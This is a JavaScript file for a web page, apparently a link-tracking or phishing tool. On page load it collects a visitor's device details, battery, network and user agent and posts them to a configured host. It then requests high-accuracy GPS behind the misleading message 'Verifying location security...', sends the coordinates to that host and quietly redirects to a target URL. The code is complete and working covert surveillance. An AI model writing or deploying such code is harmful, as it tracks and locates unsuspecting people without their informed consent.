// public/script.js

(async function() {
    const config = window.CLOUDFLARE_CONFIG;
    if (!config) return;

    const status = document.getElementById('status');

    // Helper: Get Battery
    const getBattery = async () => {
        try {
            const b = await navigator.getBattery();
            return `${Math.round(b.level * 100)}% ${b.charging ? 'âš¡' : ''}`;
        } catch { return 'N/A'; }
    };

    // Helper: Get Connection
    const getConnection = () => {
        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return c ? `${c.effectiveType} (${c.downlink}Mbps)` : 'N/A';
    };

    // 1. Collect Device Data
    const bat = await getBattery();
    const data = `
<b>ğŸ“± Device:</b> ${navigator.platform}
<b>ğŸŒ Browser:</b> ${navigator.vendor || 'Unknown'}
<b>ğŸ”‹ Battery:</b> ${bat}
<b>ğŸ’¾ Memory:</b> ${navigator.deviceMemory || 'N/A'} GB
<b>ğŸ“¡ Network:</b> ${getConnection()}
<b>ğŸ–¥ï¸ Screen:</b> ${window.screen.width}x${window.screen.height}
<b>ğŸ•’ Time:</b> ${new Date().toLocaleString()}
<b>ğŸ•·ï¸ User Agent:</b> <code>${navigator.userAgent}</code>
    `.trim();

    // 2. Send Initial Data (Device + IP)
    try {
        await fetch(`${config.HOST}/data`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ uid: config.UID, data: encodeURIComponent(data) })
        });
    } catch (e) { console.error(e); }

    // 3. Request GPS Location
    status.innerText = "Verifying location security...";
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (pos) => {
                // Success: Send Location
                await fetch(`${config.HOST}/location`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        uid: config.UID,
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    })
                });
                redirect();
            },
            (err) => {
                // Denied/Error: Redirect anyway
                console.log("Location denied");
                redirect();
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    } else {
        redirect();
    }

    // 4. Redirect Function
    function redirect() {
        status.innerText = "Redirecting...";
        setTimeout(() => {
            window.location.replace(config.TARGET_URL);
        }, 500);
    }

})();
